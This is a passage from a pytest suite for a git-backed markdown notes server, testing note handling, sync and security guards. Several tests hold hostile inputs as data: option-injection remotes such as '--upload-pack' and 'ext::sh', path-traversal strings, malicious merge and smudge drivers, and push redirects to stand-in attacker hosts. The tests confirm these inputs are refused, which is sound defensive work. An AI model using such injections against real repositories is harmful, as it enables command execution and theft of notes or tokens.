        assert (await client.delete("/api/note?path=One.md"))[0] == 200
        # An edit alongside the delete, which is what the user was syncing.
        status, body = await client.put(
            "/api/note", {"path": "sub/Two.md", "content": "---\ntitle: Two\n---\n\nedited\n"}
        )
        assert status == 200, body
        status, body = await client.post("/api/sync")
        assert status == 200, body
        committed = [c["path"] for c in body["result"]["committed"]]
        assert "sub/Two.md" in committed
        assert not any(".trash" in p for p in committed)


@requires_symlinks
@pytest.mark.asyncio
async def test_delete_refuses_a_trash_symlink_escaping_the_vault(fixtures, tmp_path) -> None:
    """A vault-supplied `.trash` symlink must not redirect the move out of the vault."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        outside = tmp_path / "outside"
        outside.mkdir()
        # Directory redirect out of the vault: symlink on POSIX, junction on
        # non-admin Windows. The guard refuses either as a `.trash` reparse point.
        platform_compat.symlink_or_junction(str(outside), str(root / ".trash"))
        status, body = await client.delete("/api/note?path=One.md")
        assert status == 400, body
        assert "symlink" in body["error"] or "escapes vault" in body["error"]
        # The note stayed put and nothing was written outside the vault.
        assert (root / "One.md").exists()
        assert list(outside.iterdir()) == []


@pytest.mark.asyncio
async def test_duplicate_note_copies_content_beside_the_source(fixtures) -> None:
    """A copy lands in the source's folder, keeping its body."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        await _clone(client, remote)
        status, body = await client.post("/api/note/duplicate", {"path": "sub/Two.md"})
        assert status == 200, body
        assert body["path"] == "sub/Two copy.md"
        _, read = await client.get("/api/note?path=sub/Two copy.md")
        assert read["content"] == "---\ntitle: Two\n---\n\nbody #tag\n"


@pytest.mark.asyncio
async def test_duplicate_note_names_are_unique(fixtures) -> None:
    """Two quick duplications must not collide, or overwrite the first copy."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        await _clone(client, remote)
        first = (await client.post("/api/note/duplicate", {"path": "One.md"}))[1]["path"]
        second = (await client.post("/api/note/duplicate", {"path": "One.md"}))[1]["path"]
        assert first == "One copy.md"
        assert second == "One copy 2.md"


@pytest.mark.asyncio
async def test_duplicate_note_requires_an_existing_note(fixtures) -> None:
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        await _clone(client, remote)
        status, body = await client.post("/api/note/duplicate", {"path": "Nope.md"})
        assert status == 404, body
        assert (await client.post("/api/note/duplicate", {}))[0] == 400


@pytest.mark.asyncio
async def test_duplicate_note_refuses_a_path_outside_the_vault(fixtures) -> None:
    """Containment is checked on the source, so the copy cannot import a file."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        await _clone(client, remote)
        status, _ = await client.post("/api/note/duplicate", {"path": "../outside.md"})
        assert status == 400


@pytest.mark.asyncio
async def test_duplicate_note_normalizes_a_windows_separator(fixtures) -> None:
    """A backslash path names the same note on every OS, so the copy lands beside it.

    ``safe_join`` normalizes the separator to validate containment, so the SOURCE
    resolves either way. Deriving the copy's name from the raw string did not:
    the backslash survived into the filename, so the copy landed at the vault
    root on POSIX and in a subdirectory on Windows.
    """
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        status, body = await client.post("/api/note/duplicate", {"path": "sub\\Two.md"})
        assert status == 200, body
        assert body["path"] == "sub/Two copy.md"
        assert (Path(vault["localPath"]) / "sub" / "Two copy.md").exists()


@pytest.mark.asyncio
async def test_duplicate_note_refreshes_backlinks(fixtures) -> None:
    """The copy inherits the source's wikilinks, so its targets gain a backlink.

    An incremental index add would keep search working while leaving every linked
    target's backlink list missing the copy until an unrelated cache rebuild.
    """
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        await _clone(client, remote)
        # One.md links to [[Two]]; the copy carries that link too.
        status, body = await client.post("/api/note/duplicate", {"path": "One.md"})
        assert status == 200, body
        _, target = await client.get("/api/note?path=sub/Two.md")
        sources = sorted(b["sourcePath"] for b in target["backlinks"])
        assert sources == ["One copy.md", "One.md"]


@pytest.mark.asyncio
async def test_move_note(fixtures) -> None:
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        status, body = await client.post(
            "/api/note/move", {"from": "One.md", "to": "moved/One.md"}
        )
        assert status == 200
        assert body["path"] == "moved/One.md"
        # The target folder is created as needed.
        assert (Path(vault["localPath"]) / "moved" / "One.md").exists()
        assert not (Path(vault["localPath"]) / "One.md").exists()


@pytest.mark.asyncio
async def test_move_refuses_to_overwrite(fixtures) -> None:
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        await _clone(client, remote)
        status, body = await client.post(
            "/api/note/move", {"from": "One.md", "to": "sub/Two.md"}
        )
        assert status == 409
        assert "already exists" in body["error"]


@pytest.mark.asyncio
async def test_search(fixtures) -> None:
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        await _clone(client, remote)
        status, body = await client.get("/api/search?q=body")
        assert status == 200
        assert [r["path"] for r in body["results"]] == ["sub/Two.md"]
        # An empty query returns nothing rather than everything.
        assert (await client.get("/api/search?q="))[1]["results"] == []


# ---------------------------------------------------------------------------
# External change detection
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_changes_reports_external_edit(fixtures) -> None:
    _mod, _remote, seed = fixtures
    async with signed_client(_mod) as client:
        status, body = await client.post("/api/vaults/attach", {"path": str(seed)})
        vault_id = body["vault"]["id"]
        _, first = await client.get(f"/api/changes?vault={vault_id}&since=0")
        start_rev = first["rev"]

        (seed / "One.md").write_text("# One\n\ntouched externally\n", encoding="utf-8")

        _, poll = await client.get(f"/api/changes?vault={vault_id}&since={start_rev}")
        assert poll["rev"] != start_rev
        assert "One.md" in poll["changed"]


@pytest.mark.asyncio
async def test_own_save_is_not_reported_as_external(fixtures) -> None:
    """Saving through the API must not look like someone else's edit."""
    _mod, _remote, seed = fixtures
    async with signed_client(_mod) as client:
        _, body = await client.post("/api/vaults/attach", {"path": str(seed)})
        vault_id = body["vault"]["id"]
        _, first = await client.get(f"/api/changes?vault={vault_id}&since=0")
        start_rev = first["rev"]

        await client.put("/api/note", {"path": "One.md", "content": "# One\n\nvia api\n"})

        _, poll = await client.get(f"/api/changes?vault={vault_id}&since={start_rev}")
        assert "One.md" not in poll["changed"]


# ---------------------------------------------------------------------------
# Token, knowledge flag, folder picker
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_pat_set_and_clear(fixtures) -> None:
    server_mod, _remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        status, body = await client.put("/api/pat", {"pat": "ghp_example"})
        assert status == 200
        assert body["hasPat"] is True
        # Stored 0600 — owner-only. Windows has no POSIX permission bits (chmod
        # only toggles the read-only flag, so the mode reads back 0o666), so the
        # exact-mode assertion is POSIX-only; the token is still written there.
        if os.name != "nt":
            assert oct(os.stat(server_mod._pat_file()).st_mode & 0o777) == "0o600"
        _, cleared = await client.put("/api/pat", {"pat": ""})
        assert cleared["hasPat"] is False


@pytest.mark.asyncio
async def test_failed_pat_write_preserves_existing_token(fixtures, monkeypatch) -> None:
    """A write failure (e.g. full disk) must not truncate/lose the stored PAT.

    The write goes to a temp then atomically replaces, so if the write raises
    the old token is still intact.
    """
    server_mod, _remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        assert (await client.put("/api/pat", {"pat": "ghp_keep_me"}))[0] == 200

        # Make the fsync during the temp write blow up, aborting before replace.
        real_fsync = os.fsync

        def boom(fd):
            raise OSError("simulated full disk")

        monkeypatch.setattr(os, "fsync", boom)
        status, _ = await client.put("/api/pat", {"pat": "ghp_new_but_doomed"})
        monkeypatch.setattr(os, "fsync", real_fsync)
        assert status != 200

        # The original token must survive untouched.
        assert server_mod._pat_file().read_text(encoding="utf-8").strip() == "ghp_keep_me"


@pytest.mark.asyncio
async def test_failed_clone_preserves_existing_pat(fixtures) -> None:
    """A clone that fails must not overwrite a previously-stored, valid PAT with
    the (possibly bad) token submitted alongside the failing request."""
    server_mod, _remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        assert (await client.put("/api/pat", {"pat": "ghp_good_existing"}))[0] == 200
        # Clone a bogus URL with a different token; the clone fails.
        status, _ = await client.post(
            "/api/vaults", {"url": "https://example.invalid/nope.git", "pat": "ghp_bad_new"}
        )
        assert status != 200
        # The good token must still be there (a boolean is all the API exposes,
        # so read the file directly to confirm the value was not replaced).
        assert server_mod._pat_file().read_text(encoding="utf-8").strip() == "ghp_good_existing"


@pytest.mark.asyncio
async def test_knowledge_flag_persists(fixtures) -> None:
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        status, body = await client.put(
            "/api/vaults/knowledge",
            {"vault": vault["id"], "knowledge": True, "sourceId": "src-42"},
        )
        assert status == 200
        assert body["vault"]["knowledge"] is True
        assert body["vault"]["knowledgeSourceId"] == "src-42"
        # Reads back from disk, not just the in-memory response.
        _, listing = await client.get("/api/vaults")
        assert listing["vaults"][0]["knowledgeSourceId"] == "src-42"


@pytest.mark.asyncio
async def test_knowledge_off_clears_source_id(fixtures) -> None:
    """Switching off must clear the id so a re-enable registers fresh."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        await client.put(
            "/api/vaults/knowledge",
            {"vault": vault["id"], "knowledge": True, "sourceId": "src-42"},
        )
        _, body = await client.put(
            "/api/vaults/knowledge", {"vault": vault["id"], "knowledge": False}
        )
        assert body["vault"]["knowledge"] is False
        assert body["vault"]["knowledgeSourceId"] is None


@pytest.mark.asyncio
async def test_sync_refused_on_read_only_vault(fixtures) -> None:
    """`/api/sync` commits, merges, and pushes — all writes — so a read-only
    vault must be refused, not silently mutated."""
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        vaults = server_mod._read_vaults_sync()
        for v in vaults:
            if v["id"] == vault["id"]:
                v["readOnly"] = True
        server_mod._write_vaults_sync(vaults)

        status, body = await client.post(f"/api/sync?vault={vault['id']}", {})
        assert status == 403, body
        assert body["code"] == "vault_read_only"


@pytest.mark.asyncio
async def test_sync_refuses_a_repointed_remote(fixtures) -> None:
    """A vault's .git/config is agent-writable; if the remote is repointed after
    clone, sync must refuse rather than push the note history to a new URL."""
    server_mod, remote, _seed = fixtures
    git_ops = server_mod.git_ops
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        root = vault["localPath"]
        trusted = vault["remoteUrl"]
        assert trusted, "clone must persist the trusted remote URL"

        # The trusted URL matches the fresh clone — a normal sync goes through.
        res = await git_ops.sync(root, branch=vault.get("branch"), trusted_remote=trusted)
        assert "conflicts" in res

        # Repoint the remote the way a prompt-injected agent could, then sync.
        _git("remote", "set-url", "origin", "https://evil.invalid/attacker.git", cwd=Path(root))
        with pytest.raises(git_ops.GitError):
            await git_ops.sync(root, branch=vault.get("branch"), trusted_remote=trusted)


@pytest.mark.asyncio
async def test_sync_refuses_extra_push_url(fixtures) -> None:
    """remote.origin.pushurl is multi-valued and git pushes to ALL of them. An
    attacker URL added alongside the trusted one must make sync refuse, not push
    the note history to both."""
    server_mod, remote, _seed = fixtures
    git_ops = server_mod.git_ops
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        root = vault["localPath"]
        trusted = vault["remoteUrl"]
        # A trusted pushurl plus an attacker pushurl — a --get (first value) check
        # would see only the trusted one and wrongly pass.
        _git("config", "--add", "remote.origin.pushurl", trusted, cwd=Path(root))
        _git("config", "--add", "remote.origin.pushurl", "https://evil.invalid/x.git", cwd=Path(root))
        with pytest.raises(git_ops.GitError):
            await git_ops.sync(root, branch=vault.get("branch"), trusted_remote=trusted)


@pytest.mark.asyncio
async def test_sync_refuses_a_redirected_gitdir(fixtures) -> None:
    """The `.git` pointer of a worktree checkout is agent-writable; if it is
    redirected to another checkout, sync must refuse rather than commit/push
    through unrelated repository metadata."""
    server_mod, remote, _seed = fixtures
    git_ops = server_mod.git_ops
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        root = vault["localPath"]
        gitdir = vault["gitDir"]
        assert gitdir, "clone must persist the canonical git dir"

        # A matching git dir syncs fine.
        res = await git_ops.sync(
            root, branch=vault.get("branch"),
            trusted_remote=vault["remoteUrl"], trusted_gitdir=gitdir,
        )
        assert "conflicts" in res

        # A git dir that no longer matches (redirected .git) must refuse.
        with pytest.raises(git_ops.GitError):
            await git_ops.sync(
                root, branch=vault.get("branch"),
                trusted_remote=vault["remoteUrl"], trusted_gitdir="/tmp/some-other-gitdir",
            )


@pytest.mark.asyncio
async def test_knowledge_unknown_vault(fixtures) -> None:
    server_mod, _remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        status, _ = await client.put(
            "/api/vaults/knowledge", {"vault": "nope", "knowledge": True}
        )
        assert status == 404


@pytest.mark.asyncio
async def test_pick_folder_unsupported(fixtures) -> None:
    """The picker is disabled in tests, so this covers the fallback path."""
    server_mod, _remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        status, body = await client.post("/api/pick-folder")
        assert status == 501
        assert "macOS" in body["error"]


@pytest.mark.asyncio
async def test_requires_a_vault(fixtures) -> None:
    server_mod, _remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        status, body = await client.get("/api/notes")
        assert status == 404
        assert "no vault" in body["error"]


# ---------------------------------------------------------------------------
# Sync
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_sync_pushes_and_pulls(fixtures) -> None:
    _mod, remote, seed = fixtures
    async with signed_client(_mod) as client:
        await _clone(client, remote)
        # Local edit through the API, then sync should commit and push it.
        await client.put("/api/note", {"path": "One.md", "content": "# One\n\nlocal\n"})
        status, body = await client.post("/api/sync")
        assert status == 200, body
        result = body["result"]
        assert result["conflicts"] == []
        assert result["committed"]
        # The remote now has the change: a fresh checkout sees it.
        _git("pull", "origin", "main", cwd=seed)
        assert "local" in (seed / "One.md").read_text(encoding="utf-8")


@pytest.mark.asyncio
async def test_sync_reports_conflict_without_overwriting(fixtures) -> None:
    """A conflicting sync leaves local content alone and reports both sides."""
    _mod, remote, seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        # Remote edit.
        (seed / "One.md").write_text("# One\n\nREMOTE side\n", encoding="utf-8")
        _git("add", "-A", cwd=seed)
        _git("commit", "-m", "remote", cwd=seed)
        _git("push", "origin", "main", cwd=seed)

        # Divergent local edit.
        await client.put("/api/note", {"path": "One.md", "content": "# One\n\nLOCAL side\n"})

        status, body = await client.post("/api/sync")
        assert status == 200
        conflicts = body["result"]["conflicts"]
        assert [c["path"] for c in conflicts] == ["One.md"]
        assert "LOCAL" in conflicts[0]["local"]
        assert "REMOTE" in conflicts[0]["remote"]
        # Nothing was overwritten on disk.
        assert "LOCAL side" in (Path(vault["localPath"]) / "One.md").read_text(encoding="utf-8")


# ---------------------------------------------------------------------------
# Regression: GPT 5.6 review on PR #970
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("subfolder", ["/etc", "../../..", "notes/../../.."])
def test_subfolder_cannot_escape_the_vault(fixtures, tmp_path: Path, subfolder: str) -> None:
    """A user-supplied subfolder must not rebase the vault onto another tree.

    `Path("/vault") / "/etc"` is `/etc`, so joining raw would silently move the
    content root — and every later `safe_join` along with it.
    """
    server_mod, _remote, _seed = fixtures
    with pytest.raises(server_mod.ApiError) as caught:
        server_mod.content_root({"localPath": str(tmp_path), "subfolder": subfolder})
    assert caught.value.code == "path_escapes_vault"


@pytest.mark.asyncio
async def test_attach_with_escaping_subfolder_persists_nothing(fixtures) -> None:
    """An escaping subfolder must be rejected up front, not saved then refused.

    Persisting the descriptor before validating leaves an unusable vault on disk
    that rebuild_cache can only reject after the fact.
    """
    _mod, _remote, seed = fixtures
    async with signed_client(_mod) as client:
        status, _ = await client.post(
            "/api/vaults/attach", {"path": str(seed), "subfolder": "/etc"}
        )
        assert status == 400
        _, listing = await client.get("/api/vaults")
        assert listing["vaults"] == [], "no vault should have been persisted"


def test_subfolder_inside_the_vault_is_kept(fixtures, tmp_path: Path) -> None:
    server_mod, _remote, _seed = fixtures
    root = server_mod.content_root({"localPath": str(tmp_path), "subfolder": "notes"})
    assert root == (tmp_path / "notes").resolve()


@pytest.mark.asyncio
async def test_rejected_push_is_reported_not_swallowed(fixtures) -> None:
    """A rejected push must not come back as a clean sync.

    The merge lands locally either way, but the remote does not have the notes —
    calling that "synced" would tell the user their work is backed up when it is
    only on this machine.
    """
    _server_mod, remote, _seed = fixtures
    async with signed_client(_server_mod) as client:
        vault = await _clone(client, remote)

        # Repoint origin at somewhere that cannot accept a push.
        _git("remote", "set-url", "origin", str(remote.parent / "gone.git"), cwd=Path(vault["localPath"]))

        status, body = await client.post(f"/api/sync?vault={vault['id']}", {})
        assert status >= 400, body
        assert body["code"] == "git_failed"


@pytest.mark.parametrize(
    "rel",
    [
        "../outside.md",
        "/etc/passwd",
        "notes/../../outside.md",
        "..\\outside.md",
        "C:\\Windows\\system.ini",
        "\\\\server\\share\\note.md",
    ],
)
def test_safe_join_rejects_escapes_before_touching_the_filesystem(fixtures, tmp_path: Path, rel: str) -> None:
    """Escapes are refused on the components, so no FS call sees the raw value.

    Windows-shaped inputs are included because a backslash is an ordinary
    filename character on posix — `ntpath` is what recognises a drive letter or
    a UNC root as absolute.
    """
    server_mod, _remote, _seed = fixtures
    with pytest.raises(server_mod.ApiError) as caught:
        server_mod.safe_join(tmp_path, rel)
    assert caught.value.code == "path_escapes_vault"


def test_safe_join_allows_a_nested_note(fixtures, tmp_path: Path) -> None:
    server_mod, _remote, _seed = fixtures
    assert server_mod.safe_join(tmp_path, "sub/dir/note.md") == tmp_path / "sub/dir/note.md"


@pytest.mark.parametrize(
    "url",
    [
        "--upload-pack=touch /tmp/pwned",
        "-u",
        "ext::sh -c 'touch /tmp/pwned'",
        "fd::7",
        "",
        # HTTP(S) URLs with embedded userinfo would bake a credential into the
        # clone argv and .git/config.
        "https://user:token@github.com/you/notes.git",
        "https://token@github.com/you/notes.git",
        "http://user:pw@example.com/notes.git",
    ],
)
def test_remote_url_validation_rejects_option_and_helper_remotes(url: str) -> None:
    """A remote may not be readable as a git option or as a command to run.

    `--upload-pack=<cmd>` lands in option position and makes git execute `<cmd>`;
    `ext::`/`fd::` are transport helpers, where the remote names a program.
    """
    with pytest.raises(git_ops.AttachError):
        git_ops.validate_remote_url(url)


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/you/notes.git",
        "http://localhost:8080/notes.git",
        "ssh://git@github.com/you/notes.git",
        "git@github.com:you/notes.git",
        "file:///tmp/notes",
        "/tmp/notes",
        "./notes",
        # Windows drive-letter paths — what tmp_path stringifies to on the
        # Windows CI runners; rejecting them broke every local-remote fixture.
        "C:\\vaults\\notes",
        "C:/vaults/notes",
        "d:\\notes",
    ],
)
def test_remote_url_validation_accepts_real_remotes(url: str) -> None:
    assert git_ops.validate_remote_url(url) == url


@pytest.mark.parametrize("url", ["C:\\vaults\\notes", "C:/vaults/notes", "file:///C:/notes"])
def test_windows_drive_paths_are_local_remotes(url: str) -> None:
    assert git_ops.is_local_remote(url)


@pytest.mark.parametrize("ref", ["--exec=whoami", "-x", "", "two words"])
def test_ref_validation_rejects_option_shaped_branches(ref: str) -> None:
    with pytest.raises(git_ops.AttachError):
        git_ops.validate_ref(ref)


@pytest.mark.asyncio
async def test_index_skips_files_the_sensitive_path_gate_rejects(fixtures, monkeypatch: pytest.MonkeyPatch) -> None:
    """A note the central gate refuses must not reach the search index.

    The vault walk lists files itself, so it never passes through `safe_join`.
    A `.md` symlink aimed at a credential store elsewhere on disk would
    otherwise have its contents indexed and become searchable. The gate returns
    None for a rejected path, and `rebuild_cache` must skip it rather than
    indexing an empty document.
    """
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)

        secret_rel = "leaky.md"
        root = Path(vault["localPath"])
        (root / secret_rel).write_text("borrowed-credential-body", "utf-8")

        real_gate = server_mod.hooks.safe_read_file_bytes

        def gated(raw: str) -> Optional[bytes]:
            # Stand in for the gate's verdict without creating a real symlink to a
            # sensitive location on the machine running the tests.
            if raw.endswith(secret_rel):
                return None
            return real_gate(raw)

        monkeypatch.setattr(server_mod.hooks, "safe_read_file_bytes", gated)

        status, body = await client.get(f"/api/search?q=borrowed-credential-body&vault={vault['id']}")
        assert status == 200, body
        assert secret_rel not in [hit["path"] for hit in body["results"]]


@pytest.mark.asyncio
async def test_scoped_sync_leaves_unrelated_files_alone(fixtures, tmp_path: Path) -> None:
    """A vault scoped to a subfolder must not commit the rest of the repo.

    `git add -A` at the repo root would sweep in whatever else the user keeps
    there and push it under a note-shaped commit message.
    """
    _server_mod, remote, _seed = fixtures
    async with signed_client(_server_mod) as client:
        vault = await _clone(client, remote, subfolder="notes")
        root = Path(vault["localPath"])

        (root / "notes").mkdir(exist_ok=True)
        (root / "notes" / "inside.md").write_text("# inside the scope\n", "utf-8")
        (root / "unrelated.txt").write_text("someone else's work in progress\n", "utf-8")

        status, body = await client.post(f"/api/sync?vault={vault['id']}", {})
        assert status == 200, body

        tracked = _git("ls-files", cwd=root).split()
        assert "notes/inside.md" in tracked
        assert "unrelated.txt" not in tracked


@pytest.mark.asyncio
async def test_repository_hooks_are_not_executed(fixtures, tmp_path: Path) -> None:
    """A hook in the vault must not run when the app commits on its own.

    A vault is an ordinary checkout, so a `pre-commit` hook can be dropped into
    it; saving a note must not become a way to execute it.
    """
    _server_mod, remote, _seed = fixtures
    async with signed_client(_server_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])

        canary = tmp_path / "hook-ran"
        hook = root / ".git" / "hooks" / "pre-commit"
        hook.parent.mkdir(parents=True, exist_ok=True)
        hook.write_text(f'#!/bin/sh\ntouch "{canary}"\n', "utf-8")
        hook.chmod(0o755)

        (root / "note.md").write_text("# triggers a commit\n", "utf-8")
        status, body = await client.post(f"/api/sync?vault={vault['id']}", {})
        assert status == 200, body

        assert "note.md" in _git("ls-files", cwd=root).split(), "the commit must still happen"
        assert not canary.exists(), "pre-commit hook was executed"


def test_notebook_pat_is_behind_the_sensitive_path_floor() -> None:
    """The Notes vault token is a live bearer credential for the user's repos.

    0600 does not isolate another process running as the same user, so agent
    file tools must not be able to read it through the shared gate. The app's own
    backend opens it directly and is unaffected.
    """
    from kiro_crew.security import is_sensitive_path

    assert is_sensitive_path("~/.kiro/crew/workspace/md-notebook/pat") is True
    # config_dir() can resolve to the legacy `.kirocrew` data-home on a migration
    # fallback, and HOME follows it — the token must be protected there too.
    assert is_sensitive_path("~/.kirocrew/workspace/md-notebook/pat") is True
    # vaults.json stores each vault's on-disk localPath, which auto-sync trusts
    # for git add/commit/push. An agent that could rewrite it would repoint a
    # vault at an unrelated repo, so it is behind the floor under both prefixes.
    assert is_sensitive_path("~/.kiro/crew/workspace/md-notebook/vaults.json") is True
    assert is_sensitive_path("~/.kirocrew/workspace/md-notebook/vaults.json") is True
    # settings.json carries `autoSync`, the bit that authorizes the background
    # loop's unattended push — an agent that could write it would flip pushing on
    # without the operator, so it is behind the floor under both prefixes too.
    assert is_sensitive_path("~/.kiro/crew/workspace/md-notebook/settings.json") is True
    assert is_sensitive_path("~/.kirocrew/workspace/md-notebook/settings.json") is True
    # Notes themselves must stay readable — the floor covers the token, not the vault.
    assert is_sensitive_path("~/.kiro/crew/workspace/md-notebook/vaults/v1/note.md") is False


def test_pat_header_is_scoped_to_github_only() -> None:
    """An unscoped `http.extraHeader` would leak the token to any https host.

    A user can attach a vault hosted anywhere; the stored PAT is a GitHub
    credential, so it must only travel to github.com.
    """
    env = git_ops._auth_env("secret-token")
    header_keys = [v for k, v in env.items() if k.startswith("GIT_CONFIG_KEY") and "http." in v]
    assert header_keys == [f"http.{git_ops.GITHUB_ORIGIN}.extraHeader"]
    assert "extraHeader" not in [
        v for k, v in env.items() if k.startswith("GIT_CONFIG_KEY") and v == "http.extraHeader"
    ]
    # The token itself must never appear outside that one scoped value.
    leaked = [k for k, v in env.items() if "secret-token" in v]
    assert leaked == [], leaked


def test_execution_bearing_config_is_neutralized() -> None:
    """Repo config that names a program to run is overridden on every call."""
    env = git_ops._auth_env(None)
    pairs = {
        env[f"GIT_CONFIG_KEY_{i}"]: env[f"GIT_CONFIG_VALUE_{i}"]
        for i in range(int(env["GIT_CONFIG_COUNT"]))
    }
    assert pairs["core.fsmonitor"] == "false"
    assert pairs["credential.helper"] == ""
    assert pairs["core.sshCommand"] == "ssh"
    assert pairs["core.hooksPath"] == os.devnull
    # Local/file transports exec the config-named pack programs directly, so
    # both are pinned back to git's own defaults.
    assert pairs["remote.origin.uploadpack"] == "git-upload-pack"
    assert pairs["remote.origin.receivepack"] == "git-receive-pack"
    # Commit/tag signing is forced off so a repo's gpg.program cannot run.
    assert pairs["commit.gpgSign"] == "false"
    assert pairs["tag.gpgSign"] == "false"
    # Signature verification is forced off too — the merge-verify path would
    # otherwise invoke gpg.program on a signed fetched commit during sync.
    assert pairs["merge.verifySignatures"] == "false"
    assert pairs["pull.verifySignatures"] == "false"
    # `file` stays permitted because attaching a local vault is supported.
    assert env["GIT_ALLOW_PROTOCOL"] == "https:ssh:file"


@pytest.mark.asyncio
async def test_probe_detects_a_repo_defined_merge_driver(fixtures) -> None:
    """A repo-defined driver must be detected so the sync can refuse it.

    `.gitattributes` names a driver and config says what it runs, so the key
    space is unbounded and cannot be neutralized with `-c` the way the fixed
    keys are. `git merge` would run it with the gateway's privileges.
    """
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        assert await git_ops.repo_supplied_driver(str(root)) == ""

        _git("config", "--local", "merge.evil.driver", "touch /tmp/pwned-%A", cwd=root)
        assert "merge.evil.driver" in await git_ops.repo_supplied_driver(str(root))


@pytest.mark.asyncio
async def test_probe_detects_a_checkout_filter_driver(fixtures) -> None:
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        _git("config", "--local", "filter.evil.smudge", "touch /tmp/pwned", cwd=root)
        assert "filter.evil.smudge" in await git_ops.repo_supplied_driver(str(root))


@pytest.mark.asyncio
async def test_probe_rejects_url_pushinsteadof_rewrite(fixtures) -> None:
    """`url.<attacker>.pushInsteadOf` rewrites the effective push URL at git's
    transport layer, so the trusted-remote check (which reads remote.origin.url)
    would not catch it. The probe must refuse it, and sync must fail."""
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        _git(
            "config", "--local",
            "url.https://evil.invalid/.pushInsteadOf", "https://github.com/",
            cwd=root,
        )
        refused = await git_ops.repo_supplied_driver(str(root))
        assert "insteadof" in refused.lower(), refused
        status, _ = await client.post(f"/api/sync?vault={vault['id']}", {})
        assert status != 200, "sync must refuse a url.*.pushInsteadOf rewrite"


@pytest.mark.asyncio
async def test_probe_rejects_core_worktree_redirect(fixtures) -> None:
    """core.worktree redirects the working tree, so `add -A` on sync would stage
    files from an attacker-chosen directory. The probe must refuse it."""
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        _git("config", "--local", "core.worktree", "/tmp", cwd=root)
        assert "core.worktree" in (await git_ops.repo_supplied_driver(str(root))).lower()
        status, _ = await client.post(f"/api/sync?vault={vault['id']}", {})
        assert status != 200, "sync must refuse a worktree-redirecting vault"


@pytest.mark.asyncio
@pytest.mark.parametrize("key,value", [
    ("http.proxy", "http://attacker:8080"),
    ("http.sslVerify", "false"),
    ("http.sslCAInfo", "/tmp/evil-ca.pem"),
])
async def test_probe_rejects_repo_http_credential_leak_config(fixtures, key, value) -> None:
    """A vault-local http proxy / TLS override could route or expose the
    PAT-bearing sync request to an attacker; the probe must refuse it."""
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        _git("config", "--local", key, value, cwd=root)
        refused = await git_ops.repo_supplied_driver(str(root))
        assert key.lower() in refused.lower(), refused


@pytest.mark.asyncio
async def test_sync_rejects_option_shaped_branch(fixtures) -> None:
    """A persisted branch like `--upload-pack=<prog>` must not reach a git
    invocation as a positional, where it would execute the named program.

    Sync prefers the checked-out branch, so detach HEAD to force the stored
    `branch` to be the value that flows into `target` (and gets validated)."""
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        _git("checkout", "--detach", cwd=Path(vault["localPath"]))
        with pytest.raises(git_ops.AttachError):
            await git_ops.sync(vault["localPath"], branch="--upload-pack=/tmp/x")


def test_git_bin_resolves_and_fails_closed(fixtures, monkeypatch, tmp_path: Path) -> None:
    """git is resolved from a trusted absolute path, never bare PATH; an
    override that does not point at a real executable fails closed."""
    server_mod = fixtures[0]
    git_ops = server_mod.git_ops
    # A non-executable override is refused rather than silently falling back to
    # a PATH lookup (the hijack vector).
    monkeypatch.setattr(git_ops, "_git_bin_memo", None)
    monkeypatch.setenv("MD_NOTEBOOK_GIT_BIN", str(tmp_path / "not-git"))
    with pytest.raises(git_ops.GitError):
        git_ops._git_bin()
    # A real system git resolves to an absolute path.
    monkeypatch.setattr(git_ops, "_git_bin_memo", None)
    monkeypatch.delenv("MD_NOTEBOOK_GIT_BIN", raising=False)
    resolved = git_ops._git_bin()
    assert os.path.isabs(resolved) and os.access(resolved, os.X_OK)


@pytest.mark.asyncio
async def test_sync_raises_on_non_conflict_merge_failure(fixtures) -> None:
    """A merge that fails WITHOUT content conflicts (e.g. merge.ff=only refusing
    a non-ff) must raise, not report a clean sync — otherwise the UI records a
    false successful-sync timestamp."""
    server_mod, remote, seed = fixtures
